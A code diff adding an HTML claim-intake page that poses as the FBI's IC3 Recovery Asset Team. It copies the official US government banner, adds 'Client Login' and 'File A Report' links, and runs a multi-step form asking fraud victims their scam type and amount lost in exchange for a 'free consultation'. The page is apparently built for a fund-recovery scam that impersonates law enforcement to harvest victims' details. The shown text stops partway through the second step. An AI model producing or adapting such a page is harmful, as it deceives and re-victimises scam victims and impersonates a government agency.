@@ -1,0 +1,1675 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Start Your Claim — IC3 RAT</title>
+  <meta name="description" content="Submit your internet crime claim to the IC3 Recovery Asset Team. Answer a few quick questions and receive a free consultation.">
+    <link rel="icon" type="image/jpeg" href="../images/ic3ratlogo.jpeg">
+    <link rel="icon" type="image/png" sizes="32x32" href="../images/favicon-32.8aaa0.png">
+    <link rel="icon" type="image/png" sizes="128x128" href="../images/favicon-128.8aaa0.png">
+    <link rel="icon" type="image/png" sizes="192x192" href="../images/favicon-192.8aaa0.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="../images/favicon-180.8aaa0.png">
+    <link rel="shortcut icon" href="../favicon.ico">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg:      #000000;
+      --surface: #0a0a0a;
+      --card:    #121212;
+      --border:  #262626;
+      --border2: #3a3a3a;
+      --accent:  #ffffff;
+      --red:     #d9381e;
+      --red-hover: #b82b14;
+      --muted:   #71717a;
+      --text:    #e4e4e7;
+      --text2:   #a1a1aa;
+      --white:   #ffffff;
+    }
+
+    html { font-family: 'Inter', system-ui, sans-serif; font-size: 16px; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    a { color: inherit; }
+
+    /* ─── GOV BANNER ─── */
+    .gov-banner {
+      background: #ffffff !important;
+      color: #1b1b1b !important;
+      border-bottom: 1px solid #e5e7eb !important;
+      font-size: 0.78rem;
+      padding: 0.4rem 1.25rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+    .gov-banner img { height: 13px; }
+
+    /* ─── SITE HEADER ─── */
+    .site-header {
+      background: #09090b;
+      border-bottom: 1px solid var(--border);
+      padding: 0.8rem 1.5rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .header-brand {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      text-decoration: none;
+    }
+    .header-brand img { height: 72px; width: auto; object-fit: contain; }
+    .header-brand-text { font-size: 1rem; font-weight: 800; color: #fff; line-height: 1.2; }
+    .header-brand-sub { font-size: 0.68rem; color: var(--text2); }
+
+    /* ─── MAIN WRAPPER ─── */
+    .claim-wrapper {
+      flex: 1;
+      display: flex;
+      align-items: flex-start;
+      justify-content: center;
+      padding: 2.5rem 1rem 4rem;
+    }
+
+    .claim-box {
+      width: 100%;
+      max-width: 620px;
+    }
+
+    /* ─── GLOBAL HEADER ─── */
+    .claim-global-header {
+      text-align: center;
+      margin-bottom: 2rem;
+    }
+    .claim-main-heading {
+      font-size: 2rem;
+      font-weight: 900;
+      color: var(--white);
+      margin-bottom: 0.5rem;
+      letter-spacing: -0.5px;
+    }
+    .claim-sub-heading {
+      font-size: 0.95rem;
+      color: var(--text2);
+      line-height: 1.6;
+      max-width: 480px;
+      margin: 0 auto;
+    }
+
+    /* ─── PROGRESS BAR ─── */
+    .progress-wrap {
+      margin-bottom: 2rem;
+    }
+    .progress-meta {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 0.55rem;
+      font-size: 0.78rem;
+      font-weight: 600;
+      color: var(--text2);
+    }
+    .progress-pct { color: var(--white); font-weight: 700; }
+    .progress-track {
+      height: 4px;
+      background: var(--border);
+      border-radius: 999px;
+      overflow: hidden;
+    }
+    .progress-fill {
+      height: 100%;
+      background: var(--white);
+      border-radius: 999px;
+      transition: width 0.45s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    /* ─── STEP CARD ─── */
+    .step-card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 2rem 2rem 1.75rem;
+    }
+
+    .step-label {
+      font-size: 0.72rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      color: var(--text2);
+      margin-bottom: 0.6rem;
+    }
+
+    .step-title {
+      font-size: 1.55rem;
+      font-weight: 800;
+      color: var(--white);
+      margin-bottom: 0.4rem;
+      letter-spacing: -0.3px;
+      line-height: 1.25;
+    }
+
+    .step-instruction {
+      font-size: 0.9rem;
+      color: var(--text2);
+      margin-bottom: 1.5rem;
+      line-height: 1.55;
+    }
+
+    /* ─── SELECTABLE OPTION CARDS (TEXT ONLY - NO ICONS) ─── */
+    .options-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 0.65rem;
+      margin-bottom: 1.75rem;
+    }
+    .options-grid.single-col {
+      grid-template-columns: 1fr;
+    }
+
+    .option-card {
+      position: relative;
+      cursor: pointer;
+    }
+    .option-card input[type="radio"] {
+      position: absolute;
+      opacity: 0;
+      width: 0;
+      height: 0;
+    }
+    .option-label {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 0.75rem;
+      padding: 0.9rem 1.1rem;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 0.92rem;
+      font-weight: 500;
+      color: var(--text);
+      transition: all 0.15s;
+      user-select: none;
+      line-height: 1.3;
+    }
+    .option-label:hover {
+      border-color: var(--border2);
+      background: #18181b;
+      color: var(--white);
+    }
+    .option-card input:checked + .option-label {
+      border-color: var(--white);
+      background: #18181b;
+      color: var(--white);
+      font-weight: 700;
+    }
+    .option-check {
+      width: 18px;
+      height: 18px;
+      border-radius: 50%;
+      border: 2px solid var(--border2);
+      margin-left: auto;
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.15s;
+    }
+    .option-card input:checked + .option-label .option-check {
+      border-color: var(--white);
+      background: var(--white);
+    }
+    .option-card input:checked + .option-label .option-check::after {
+      content: '';
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: #000;
+    }
+
+    /* ─── FORM FIELDS ─── */
+    .field-block { margin-bottom: 1.25rem; }
+    .field-block label {
+      display: block;
+      font-size: 0.8rem;
+      font-weight: 700;
+      color: var(--text2);
+      text-transform: uppercase;
+      letter-spacing: 0.6px;
+      margin-bottom: 0.45rem;
+    }
+    .field-block textarea,
+    .field-block input,
+    .field-block select {
+      width: 100%;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 0.85rem 1rem;
+      color: var(--white);
+      font-size: 0.92rem;
+      font-family: inherit;
+      outline: none;
+      transition: border-color 0.15s;
+      -webkit-appearance: none;
+    }
+    .field-block textarea { resize: vertical; min-height: 120px; }
+    .field-block input::placeholder,
+    .field-block textarea::placeholder { color: var(--muted); }
+    .field-block input:focus,
+    .field-block textarea:focus,
+    .field-block select:focus { border-color: var(--white); }
+    .field-block select option { background: #121212; color: #fff; }
+
+    /* ─── PASSWORD STRENGTH ─── */
+    .pw-strength-bar { display: flex; gap: 4px; margin-top: 6px; }
+    .pw-seg { height: 4px; flex: 1; border-radius: 2px; background: var(--border); transition: background 0.2s; }
+    .pw-seg.weak { background: #ef4444; }
+    .pw-seg.fair { background: #f59e0b; }
+    .pw-seg.strong { background: #10b981; }
+    .pw-hint { font-size: 0.72rem; color: var(--muted); margin-top: 4px; }
+
+    /* ─── FILE UPLOAD (TEXT ONLY) ─── */
+    .upload-zone {
+      border: 1px dashed var(--border2);
+      border-radius: 8px;
+      padding: 1.5rem;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.15s;
+      background: var(--surface);
+    }
+    .upload-zone:hover, .upload-zone.drag-over {
+      border-color: var(--white);
+      background: #18181b;
+    }
+    .upload-text { font-size: 0.88rem; color: var(--text); font-weight: 600; }
+    .upload-text span { color: var(--white); text-decoration: underline; }
+    .upload-sub { font-size: 0.73rem; color: var(--muted); margin-top: 0.35rem; }
+    .upload-input { display: none; }
+    .uploaded-files { margin-top: 0.75rem; display: flex; flex-direction: column; gap: 0.4rem; }
+    .uploaded-file {
+      display: flex; align-items: center; gap: 0.5rem;
+      background: #18181b; border: 1px solid var(--border);
+      border-radius: 6px; padding: 0.5rem 0.75rem;
+      font-size: 0.8rem; color: var(--text);
+    }
+    .uploaded-file-name { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+    .uploaded-file-remove {
+      background: none; border: none; color: var(--muted);
+      cursor: pointer; font-size: 1rem; padding: 0; line-height: 1;
+    }
+    .uploaded-file-remove:hover { color: #ef4444; }
+    .field-note {
+      font-size: 0.74rem;
+      color: var(--muted);
+      margin-bottom: 0.6rem;
+    }
+
+    /* ─── NAVIGATION BUTTONS ─── */
+    .nav-row {
+      display: flex;
+      gap: 0.75rem;
+      align-items: center;
+      margin-top: 1.5rem;
+    }
+    .btn-back {
+      display: flex; align-items: center; gap: 0.35rem;
+      background: transparent;
+      border: 1px solid var(--border2);
+      border-radius: 8px;
+      padding: 0.8rem 1.25rem;
+      color: var(--text);
+      font-size: 0.88rem;
+      font-weight: 600;
+      font-family: inherit;
+      cursor: pointer;
+      transition: all 0.15s;
+      flex-shrink: 0;
+      text-decoration: none;
+    }
+    .btn-back:hover { border-color: var(--white); color: var(--white); }
+    .btn-next {
+      flex: 1;
+      background: var(--red);
+      border: none;
+      border-radius: 8px;
+      padding: 0.9rem 1.5rem;
+      color: #fff;
+      font-size: 1rem;
+      font-weight: 700;
+      font-family: inherit;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .btn-next:hover {
+      background: var(--red-hover);
+    }
+    .btn-submit {
+      background: var(--red);
+    }
+    .btn-submit:hover { background: var(--red-hover); }
+
+    /* ─── STEP 5 FOOTER TEXT ─── */
+    .form-footer-text {
+      font-size: 0.76rem;
+      color: var(--muted);
+      text-align: center;
+      margin-top: 1rem;
+      line-height: 1.6;
+    }
+    .form-footer-text a { color: var(--white); text-decoration: underline; }
+    .sign-in-link {
+      text-align: center;
+      margin-top: 0.85rem;
+      font-size: 0.83rem;
+      color: var(--text2);
+    }
+    .sign-in-link a { color: var(--white); font-weight: 600; text-decoration: underline; }
+
+    /* ─── FORM TWO-COL ─── */
+    .form-two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+
+    /* ─── VALIDATION ─── */
+    .field-error {
+      font-size: 0.73rem;
+      color: #ef4444;
+      margin-top: 4px;
+      display: none;
+    }
+    .field-block.has-error input,
+    .field-block.has-error textarea,
+    .field-block.has-error select { border-color: #ef4444 !important; }
+    .field-block.has-error .field-error { display: block; }
+
+    /* ─── STEP TRANSITION ─── */
+    .step-view { display: none; }
+    .step-view.active { display: block; animation: stepIn 0.25s ease; }
+    @keyframes stepIn {
+      from { opacity: 0; transform: translateY(6px); }
+      to   { opacity: 1; transform: none; }
+    }
+
+    /* ─── SUCCESS STATE ─── */
+    .success-card {
+      text-align: center;
+      padding: 1.5rem 0.5rem;
+    }
+    .success-title { font-size: 1.6rem; font-weight: 900; color: #fff; margin-bottom: 0.5rem; }
+    .success-sub { font-size: 0.9rem; color: var(--text2); line-height: 1.65; margin-bottom: 1.5rem; }
+    .tracking-chip {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      background: #18181b;
+      border: 1px solid var(--border2);
+      border-radius: 8px;
+      padding: 0.65rem 1.25rem;
+      font-family: monospace;
+      font-size: 1.1rem;
+      font-weight: 800;
+      color: var(--white);
+      letter-spacing: 2px;
+      margin-bottom: 1.5rem;
+    }
+    .success-actions { display: flex; gap: 0.75rem; justify-content: center; flex-wrap: wrap; }
+
+    /* ─── FOOTER ─── */
+    .site-footer {
+      background: #09090b;
+      border-top: 1px solid var(--border);
+      color: var(--text2);
+      padding: 2.5rem 1.5rem;
+      margin-top: auto;
+    }
+    .site-footer-inner {
+      max-width: 900px;
+      margin: 0 auto;
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 1.5rem;
+    }
+    .footer-col-title { font-weight: 800; font-size: 0.95rem; color: #fff; margin-bottom: 0.6rem; }
+    .footer-links { list-style: none; }
+    .footer-links li { margin-bottom: 0.4rem; }
+    .footer-links a { color: var(--text2); text-decoration: none; font-size: 0.88rem; }
+    .footer-links a:hover { color: #fff; text-decoration: underline; }
+
+    /* ─── RESPONSIVE ─── */
+    @media (max-width: 600px) {
+      .options-grid { grid-template-columns: 1fr; }
+      .form-two-col { grid-template-columns: 1fr; }
+      .step-card { padding: 1.5rem 1.25rem; }
+      .claim-main-heading { font-size: 1.6rem; }
+      .site-footer-inner { grid-template-columns: 1fr 1fr; }
+    }
+
+    .security-badge {
+      text-align: center;
+      font-size: 0.72rem;
+      color: var(--muted);
+      margin-top: 1.25rem;
+    }
+  </style>
+
+<meta name="color-scheme" content="dark">
+<style id="force-dark-mode">
+:root { color-scheme: dark !important; }
+html, body {
+  background-color: #030712 !important;
+  color: #f8fafc !important;
+  color-scheme: dark !important;
+}
+.usa-section, .usa-layout-docs, .usa-header, .usa-footer, main, header, footer, nav, body {
+  background-color: #030712 !important;
+  color: #f8fafc !important;
+}
+/* ── US Government Banner & Dropdown (Strict White BG & Black Text) ── */
+.usa-banner,
+.usa-banner *,
+.usa-banner header,
+.usa-banner .usa-banner__header,
+.usa-banner .usa-banner__inner,
+.usa-banner .usa-banner__content,
+.usa-banner p,
+.usa-banner span,
+.usa-banner strong,
+.usa-banner button,
+.usa-banner .usa-banner__header-text,
+.usa-banner .usa-banner__header-action,
+.usa-banner .usa-banner__button,
+.usa-banner .usa-banner__button-text {
+  color: #1b1b1b !important;
+  background-color: #ffffff !important;
+}
+
+.usa-banner {
+  background-color: #ffffff !important;
+  border-bottom: 1px solid #e5e7eb !important;
+  position: relative !important;
+  z-index: 1000 !important;
+  width: 100% !important;
+}
+
+.usa-banner .usa-banner__header {
+  padding: 0.4rem 1.25rem !important;
+}
+
+.usa-banner .usa-banner__header-action,
+.usa-banner .usa-banner__button,
+.usa-banner .usa-banner__button-text {
+  color: #1b1b1b !important;
+  text-decoration: underline !important;
+  cursor: pointer !important;
+  font-weight: 600 !important;
+}
+
+.usa-banner .usa-banner__button:hover,
+.usa-banner .usa-banner__header-action:hover {
+  color: #000000 !important;
+  background-color: #f3f4f6 !important;
+}
+
+.usa-banner .usa-banner__content {
+  position: relative !important;
+  left: auto !important;
+  right: auto !important;
+  padding: 1rem 1.25rem 1.25rem !important;
+  border-top: 1px solid #e5e7eb !important;
+  background-color: #ffffff !important;
+}
+
+.usa-banner .usa-banner__content[hidden] {
+  display: none !important;
+}
+
+.usa-banner .usa-banner__lock-image,
+.usa-banner .usa-banner__lock-image path {
+  fill: #1b1b1b !important;
+  color: #1b1b1b !important;
+}
+</style>
+
+    <script defer src="../js/recovery-toast.js"></script>
+<style>
+</style>
+
+    <script src="../js/uswds-init.min.30dc2.js"></script>
+    <script defer src="../js/uswds.min.30dc2.js"></script>
+    <link rel="stylesheet" href="../css/uswds.min.12c2d.css">
+    <link rel="stylesheet" href="../css/site.d8c3f.css">
+    <script defer src="../js/site.js"></script>
+    
+<style>
+/* ── Full-width navbar ── */
+.usa-nav-container {
+  max-width: 100% !important;
+  padding-left: 1rem !important;
+  padding-right: 1rem !important;
+}
+.usa-header {
+  width: 100% !important;
+}
+</style>
+
+<style id="modal-fix">
+/* ── File-a-Complaint Modal — definitive override ── */
+#fileTerms {
+  display: none !important;
+  position: fixed !important;
+  inset: 0 !important;
+  width: 100vw !important;
+  height: 100vh !important;
+  margin: 0 !important;
+  padding: 0 !important;
+  background: rgba(0,0,0,0.9) !important;
+  backdrop-filter: blur(6px) !important;
+  -webkit-backdrop-filter: blur(6px) !important;
+  z-index: 2147483647 !important;
+  box-sizing: border-box !important;
+  overflow: hidden !important;
+  border: none !important;
+  border-radius: 0 !important;
+  max-width: none !important;
+  max-height: none !important;
+}
+#fileTerms.is-visible {
+  display: flex !important;
+  align-items: center !important;
+  justify-content: center !important;
+}
+#fileTerms > .usa-modal__content {
+  display: block !important;
+  position: relative !important;
+  inset: auto !important;
+  background: #ffffff !important;
+  border-radius: 12px !important;
+  border: none !important;
+  box-shadow: 0 24px 80px rgba(0,0,0,0.95) !important;
+  width: calc(100% - 2rem) !important;
+  max-width: 660px !important;
+  max-height: 82vh !important;
+  overflow-y: auto !important;
+  overflow-x: hidden !important;
+  scroll-behavior: auto !important;
+  padding: 2rem !important;
+  margin: 0 auto !important;
+  flex-shrink: 0 !important;
+  z-index: auto !important;
+}
+#fileTerms > .usa-modal__content > .usa-modal__main {
+  padding: 0 !important;
+  margin: 0 !important;
+  width: 100% !important;
+}
+
+/* ── Force Crisp Black Text across Terms Modal ── */
+#fileTerms,
+#fileTerms > .usa-modal__content,
+#fileTerms > .usa-modal__content > .usa-modal__main,
+#fileTerms .font-serif-sm,
+#fileTerms .font-serif-sm *,
+#fileTerms p,
+#fileTerms li,
+#fileTerms ul,
+#fileTerms span,
+#fileTerms strong,
+#fileTerms div:not(.usa-alert--warning *) {
+  color: #000000 !important;
+}
+
+#fileTerms cite {
+  color: #000000 !important;
+  font-weight: 700 !important;
+  font-style: normal !important;
+}
+
+#fileTerms .usa-alert--warning {
+  background-color: #fef3c7 !important;
+  border-left: 4px solid #d97706 !important;
+  border-radius: 6px !important;
+  padding: 1rem !important;
+  margin-bottom: 1rem !important;
+}
+#fileTerms .usa-alert--warning .usa-alert__heading,
+#fileTerms .usa-alert--warning h4,
+#fileTerms #fileTermsHeading {
+  color: #92400e !important;
+  font-weight: 700 !important;
+}
+#fileTerms .usa-alert--warning .usa-alert__text,
+#fileTerms .usa-alert--warning p {
+  color: #78350f !important;
+}
+
+#fileTerms a,
+#fileTerms .font-serif-sm a {
+  color: #005ea2 !important;
+  text-decoration: underline !important;
+}
+
+#fileTerms .usa-modal__footer {
+  margin-top: 1.5rem !important;
+  padding-top: 1rem !important;
+  border-top: 1px solid #e2e8f0 !important;
+}
+
+#fileTerms #acceptFile,
+#fileTerms .usa-button[id="acceptFile"] {
+  background-color: #d9381e !important;
+  color: #ffffff !important;
+  border: none !important;
+}
+
+#fileTerms .usa-button--base {
+  background-color: #f1f5f9 !important;
+  color: #0f172a !important;
+  border: 1px solid #cbd5e1 !important;
+}
+
+body.is-modal-open {
+  overflow: hidden !important;
+}
+</style>
+
+</head>
+<body>
+
+<!-- ── GOV BANNER ── -->
+    <section class="usa-banner padding-bottom-2 desktop:padding-bottom-0" aria-label="Official website of the United States government">
+        <div class="usa-accordion">
+            <header class="usa-banner__header">
+                <div class="usa-banner__inner">
+                    <div class="grid-col-auto">
+                        <img aria-hidden="true" class="usa-banner__header-flag" src="../images/us_flag_small.36692.png" alt="U.S. Flag">
+                    </div>
+                    <div class="grid-col-fill tablet:grid-col-auto" aria-hidden="true">
+                        <p class="usa-banner__header-text">An official website of the United States government</p>
+                        <p class="usa-banner__header-action">Here&rsquo;s how you know</p>
+                    </div>
+                    <button type="button" class="usa-accordion__button usa-banner__button" aria-expanded="false" aria-controls="gov-banner-default">
+                        <span class="usa-banner__button-text">Here&rsquo;s how you know</span>
+                    </button>
+                </div>
+            </header>
+            <div class="usa-banner__content usa-accordion__content" id="gov-banner-default" hidden style="display:none;">
+                <div class="grid-row grid-gap-lg">
+                    <div class="usa-banner__guidance tablet:grid-col-6">
+                        <img class="usa-banner__icon usa-media-block__img" src="../images/icon-dot-gov.36692.svg" role="img" alt="" aria-hidden="true">
+                        <div class="usa-media-block__body">
+                            <p>
+                                <strong>Official websites use .gov or .org</strong><br>
+                                The website belongs to an official government organization in the United States.
+                            </p>
+                        </div>
+                    </div>
+                    <div class="usa-banner__guidance tablet:grid-col-6">
+                        <img class="usa-banner__icon usa-media-block__img" src="../images/icon-https.36692.svg" role="img" alt="" aria-hidden="true">
+                        <div class="usa-media-block__body">
+                            <p>
+                                <strong>Secure .gov websites use HTTPS</strong><br>
+                                A <strong>lock</strong> (
+                                <span class="icon-lock">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="52" height="64" viewbox="0 0 52 64" class="usa-banner__lock-image" role="img" aria-labelledby="banner-lock-description-default" focusable="false">
+                                        <title id="banner-lock-title-default">Lock</title>
+                                        <desc id="banner-lock-description-default">Locked padlock icon</desc>
+                                        <path fill="#000000" fill-rule="evenodd" d="M26 0c10.493 0 19 8.507 19 19v9h3a4 4 0 0 1 4 4v28a4 4 0 0 1-4 4H4a4 4 0 0 1-4-4V32a4 4 0 0 1 4-4h3v-9C7 8.507 15.507 0 26 0zm0 8c-6.075 0-11 4.925-11 11v9h22v-9c0-6.075-4.925-11-11-11z"></path>
+                                    </svg>
+                                </span>) or <strong>https://</strong> means you’ve safely connected to the .gov website. Share sensitive information only on official, secure websites.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+<div class="usa-overlay"></div>
+    <header id="ic3Header" class="usa-header usa-header--basic usa-header--megamenu desktop:margin-0">
+        <div class="usa-nav-container">
+            <div class="usa-navbar">
+                <div class="usa-logo">
+                    <a href="index.html">
+                        <img class="usa-footer__logo-img" src="../images/ic3ratlogo.jpeg" alt="IC3 RAT Logo" style="height:72px;width:auto;object-fit:contain;">
+                    </a>
+                    <em class="usa-logo__text"><a href="index.html">FBI IC3 Recovery Asset Team (RAT)</a></em>
+                </div>
+                <button type="button" class="usa-menu-btn">Menu</button>
+            </div>
+            <nav aria-label="Primary navigation" class="usa-nav">
+                <button type="button" class="usa-nav__close">
+                    <svg width="24" height="24" viewbox="0 0 24 24" role="img">
+                        <title>Close</title>
+                        <path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z" fill="#ffffff"></path>
+                    </svg>
+                </button>
+                <ul class="usa-nav__primary usa-accordion">
+                    <li class="usa-nav__primary-item">
+                        <a class="usa-nav-link" data-open-modal aria-controls="fileTerms" href="#fileTerms" style="background:#d9381e!important;color:#ffffff!important;border-radius:4px;padding:0.5rem 1.25rem;font-weight:700;text-decoration:none">File A Report</a>
+                    </li>
+                    <li class="usa-nav__primary-item">
+                        <button type="button" class="usa-accordion__button usa-nav__link" aria-expanded="false" aria-controls="public-nav">
+                            <span>Public Info</span>
+                        </button>
+                        <div id="public-nav" class="usa-nav__submenu usa-megamenu">
+                            <div class="grid-row grid-gap-4">
+                                <div class="usa-col">
+                                    <ul class="usa-nav__submenu-list">
+                                        <li class="usa-nav__submenu-item">
+                                            <a href="../Home/RAT.html">IC3 RAT Operational Report</a>
+                                        </li>
+                                        <li class="usa-nav__submenu-item">
+                                            <a href="../PSA.html">Public Service Announcements</a>
+                                        </li>
+                                        <li class="usa-nav__submenu-item">
+                                            <a href="../Outreach/Brochures.html">Brochures</a>
+                                        </li>
+                                        <li class="usa-nav__submenu-item">
+                                            <a href="../AnnualReport/Reports.html">Annual Reports</a>
+                                        </li>
+                                        <li class="usa-nav__submenu-item">
+                                            <a href="../Outreach/Resources.html">Resources</a>
+                                        </li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                    </li>
+                    <li class="usa-nav__primary-item">
+                        <button type="button" class="usa-accordion__button usa-nav__link" aria-expanded="false" aria-controls="industry-nav">
+                            <span>Industry Info</span>
+                        </button>
+                        <div id="industry-nav" class="usa-nav__submenu usa-megamenu">
+                            <div class="grid-row grid-gap-4">
+                                <div class="usa-col">
+                                    <ul class="usa-nav__submenu-list">
+                                        <li class="usa-nav__submenu-item">
+                                            <a href="../CSA.html">Industry Alerts</a>
+                                        </li>
+                                        <li class="usa-nav__submenu-item">
+                                            <a href="../ContactFBICyber.html">Contact FBI Cyber Task Force</a>
+                                        </li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                    </li>
+                    <li class="usa-nav__primary-item">
+                        <a class="usa-nav-link" href="../Outreach/PrivateSectorEngagement.html">Cyber Private Sector</a>
+                    </li>
+                    <li class="usa-nav__primary-item">
+                        <button type="button" class="usa-accordion__button usa-nav__link" aria-expanded="false" aria-controls="crime-info-nav">
+                            <span>Crime Info</span>
+                        </button>
+                        <div id="crime-info-nav" class="usa-nav__submenu usa-megamenu">
+                            <div class="grid-row grid-gap-4">
+                                <div class="usa-col">
+                                    <ul class="usa-nav__submenu-list">
+                                        <li class="usa-nav__submenu-item">
+                                            <a href="../CrimeInfo/BEC.html">Business Email Compromise (BEC)</a>
+                                        </li>
+                                        <li class="usa-nav__submenu-item">
+                                            <a href="../CrimeInfo/AccountTakeover.html">Account Takeover (ATO)</a>
+                                        </li>
+                                        <li class="usa-nav__submenu-item">
+                                            <a href="../CrimeInfo/Botnet-DDoS.html">Botnet/DDoS/TDoS</a>
+                                        </li>
+                                        <li class="usa-nav__submenu-item">
+                                            <a href="../CrimeInfo/ChineseAuthorityImpersonation.html">Chinese Authority Impersonation</a>
+                                        </li>
+                                        <li class="usa-nav__submenu-item">
+                                            <a href="../CrimeInfo/Cryptocurrency.html">Cryptocurrency</a>
+                                        </li>
+                                        <li class="usa-nav__submenu-item">
+                                            <a href="../CrimeInfo/DataBreach.html">Data Breach</a>
+                                        </li>
+                                        <li class="usa-nav__submenu-item">
+                                            <a href="../CrimeInfo/ElderFraud.html">Elder Fraud</a>
+                                        </li>
+                                        <li class="usa-nav__submenu-item">
+                                            <a href="../CrimeInfo/Investment.html">Investment Fraud</a>
+                                        </li>
+                                        <li class="usa-nav__submenu-item">
+                                            <a target="_blank" rel="noopener" href="https://www.fbi.gov/scams-and-safety">Other Common Scams</a>
+                                        </li>
+                                        <li class="usa-nav__submenu-item">
+                                            <a href="../CrimeInfo/Ransomware.html">Ransomware</a>
+                                        </li>
+                                        <li class="usa-nav__submenu-item">
+                                            <a href="../CrimeInfo/TechSupportGovImpersonation.html">Tech/Customer Support and Government Impersonation</a>
+                                        </li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                    </li>
+                    <li class="usa-nav__primary-item">
+                        <a class="usa-nav-link" href="../login.html" style="font-weight:700;">Client Login</a>
+                    </li>
+                </ul>
+                <section aria-label="Search component">
+                    <form action="../Search/Results.html" autocomplete="off" class="usa-search usa-search--small" role="search" method="get">
+                        <label class="usa-sr-only" for="search-field">Search</label>
+                        <input class="usa-input" id="search-field" type="search" name="term">
+                        <button class="usa-button" type="submit">
+                            <img src="images/search--white.a22b1.svg" class="usa-search__submit-icon" alt="Search">
+                        </button>
+                    </form>
+                </section>
+            </nav>
+        </div>
+    </header>
+
+<!-- ── MAIN ── -->
+<div class="claim-wrapper">
+  <div class="claim-box">
+
+    <!-- Global Header -->
+    <div class="claim-global-header" id="globalHeader">
+      <h1 class="claim-main-heading">Start Your Claim</h1>
+      <p class="claim-sub-heading">Answer a few quick questions and we'll arrange a free consultation to discuss your case.</p>
+    </div>
+
+    <!-- Progress Bar -->
+    <div class="progress-wrap" id="progressWrap">
+      <div class="progress-meta">
+        <span id="progressLabel">Step 1 of 5</span>
+        <span class="progress-pct" id="progressPct">20%</span>
+      </div>
+      <div class="progress-track">
+        <div class="progress-fill" id="progressFill" style="width: 20%;"></div>
+      </div>
+    </div>
+
+    <!-- ═══════════ STEP 1 ═══════════ -->
+    <div class="step-card step-view active" id="step1">
+      <div class="step-label">Step 1 of 5</div>
+      <h2 class="step-title">What happened to you?</h2>
+      <p class="step-instruction">Select the option that best describes your situation.</p>
+
+      <div class="options-grid" id="step1Options">
+        <label class="option-card">
+          <input type="radio" name="scamType" value="Trading / Investment Scam">
+          <span class="option-label">
+            Trading / Investment Scam
+            <span class="option-check"></span>
+          </span>
+        </label>
+        <label class="option-card">
+          <input type="radio" name="scamType" value="Cryptocurrency Fraud">
+          <span class="option-label">
+            Cryptocurrency Fraud
+            <span class="option-check"></span>
+          </span>
+        </label>
+        <label class="option-card">
+          <input type="radio" name="scamType" value="Forex Trading Scam">
+          <span class="option-label">
+            Forex Trading Scam
+            <span class="option-check"></span>
+          </span>
+        </label>
+        <label class="option-card">
+          <input type="radio" name="scamType" value="Romance Scam">
+          <span class="option-label">
+            Romance Scam
+            <span class="option-check"></span>
+          </span>
+        </label>
+        <label class="option-card">
+          <input type="radio" name="scamType" value="Phishing / Impersonation">
+          <span class="option-label">
+            Phishing / Impersonation
+            <span class="option-check"></span>
+          </span>
+        </label>
+        <label class="option-card">
+          <input type="radio" name="scamType" value="Bank Fraud">
+          <span class="option-label">
+            Bank Fraud
+            <span class="option-check"></span>
+          </span>
+        </label>
+        <label class="option-card">
+          <input type="radio" name="scamType" value="NFT / Digital Asset Scam">
+          <span class="option-label">
+            NFT / Digital Asset Scam
+            <span class="option-check"></span>
+          </span>
+        </label>
+        <label class="option-card">
+          <input type="radio" name="scamType" value="Other">
+          <span class="option-label">
+            Other
+            <span class="option-check"></span>
+          </span>
+        </label>
+      </div>
+
+      <div class="nav-row">
+        <button class="btn-next" id="btn1Next" onclick="goNext(1)">Continue →</button>
+      </div>
+
+      <div class="security-badge">256-bit SSL encrypted · Your data is secure</div>
+    </div>
+
+    <!-- ═══════════ STEP 2 ═══════════ -->
+    <div class="step-card step-view" id="step2">
+      <div class="step-label">Step 2 of 5</div>
+      <h2 class="step-title">How much did you lose?</h2>
+      <p class="step-instruction">Select the approximate amount.</p>
+
+      <div class="options-grid single-col" id="step2Options">
+        <label class="option-card">
+          <input type="radio" name="lossAmount" value="Under $5,000">
+          <span class="option-label">
+            Under $5,000
+            <span class="option-check"></span>
+          </span>
+        </label>
+        <label class="option-card">
+          <input type="radio" name="lossAmount" value="$5,000 - $25,000">
+          <span class="option-label">
+            $5,000 – $25,000
+            <span class="option-check"></span>
+          </span>
+        </label>
+        <label class="option-card">
+          <input type="radio" name="lossAmount" value="$25,000 - $100,000">
+          <span class="option-label">
+            $25,000 – $100,000
+            <span class="option-check"></span>
+          </span>
+        </label>
